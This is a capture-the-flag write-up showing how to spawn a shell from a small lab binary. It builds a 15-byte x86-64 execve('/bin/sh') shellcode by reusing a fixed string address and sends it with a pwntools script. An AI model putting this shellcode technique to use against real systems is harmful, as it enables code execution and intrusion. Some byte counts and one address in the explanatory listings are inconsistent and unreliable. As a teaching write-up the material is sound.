# Shellcoding 'Free Your Mind' Writeup

This challenge is a short, 16 line program, with one input. The goal is to gain a shell on the remote system.

```c
#include <stdio.h>
#include <unistd.h>

char shellcode[16];

int main() {
    char binsh[8] = "/bin/sh";

    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("I'm trying to free your mind, Neo. But I can only show you the door. You're the one that has to walk through it.\n");
    read(0, shellcode, 16);

    ((void (*)()) (shellcode))();
}
```

If we run `checksec` on the binary, we see that the stack is in fact executable ('NX disabled' and 'Has RWX segments'):
```
━━┫ checksec shellcoding
[*] '/home/shellcoding/shellcoding'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Your input is cast to a function pointer and called. This means that in order to get a shell, we must provide some shellcode that when executed will result in a shell. This is a relatively common situation, and many shellcodes are publicly available. The reason we are unable to use public shellcodes, however, is that the length of our input is limited to 16 bytes. The short `x86_64` linux shellcodes are around 20 bytes, which is too long.

In this situation, it might be a good approach to modify an existing shellcode, such as the one here: https://packetstormsecurity.com/files/153038/Linux-x64-execve-bin-sh-Shellcode.html.
```asm
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
```

This shellcode is 23 bytes long, and we need to find a way to shrink it to 16 bytes long. We can look at the lengths of each instruction to see the best ways to shorten the shellcode:

```
xor rsi,rsi - 3
push rsi - 1
mov rdi,0x68732f2f6e69622f - 6
push rdi - 1
push rsp - 1
pop rdi - 1
push 59 - 2
pop rax - 1
cdq - 1
syscall - 2
```

The shellcode sets up the arguments for `syscall`. `rax` must be set to 59, `rdi` must be a pointer to `/bin/sh` (or the command to be executed), and `rsi` should be set to 0.

Noteably, this program has PIE disabled, and the string "/bin/sh" is loaded in the data section of the binary.
```
char binsh[8] = "/bin/sh";
```

This means that if we run the binary, the string `"/bin/sh"` will be in the same place in memory every run. We can use gdb (with GEF) to search for its location:

```
gef➤  break main
Breakpoint 1 at 0x401146
gef➤  run
Starting program: /home/nat/Dev/bootcamp-2020/pwn/shellcoding/src/shellcoding 

Breakpoint 1, 0x0000000000401146 in main ()
gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/home/shellcoding/shellcoding'(0x400000-0x403000), permission=r-x
  0x40115b - 0x401162  →   "/bin/sh" 
[+] In '/lib/libc-2.31.so'(0x7ffff7e0e000-0x7ffff7fc3000), permission=r-x
  0x7ffff7f8dafa - 0x7ffff7f8db01  →   "/bin/sh"
```

The pointer to `"/bin/sh"` is `0x40115b`. Another version exists in the libc, but the location libc is loaded at will change each run.


We can now modify the shellcode so that instead of loading a pointer to the stack, we use the existing pointer to `"/bin/sh"`:
```
xor rsi,rsi - 3
push 0x4011b3 - 5
pop rdi - 1
push 59 - 2
pop rax - 1
cdq - 1
syscall - 2
```

This shellcode is 15 bytes long, which is short enough. We can use pwntools to assemble and send it:

```python
from pwn import *

p = process("./shellcoding")
context.arch = 'amd64'

shellcode = asm("""
xor rsi,rsi
push 0x40115b
pop rdi
push 59
pop rax
cdq
syscall
""")

p.sendline(bytes(shellcode))
p.interactive()
```
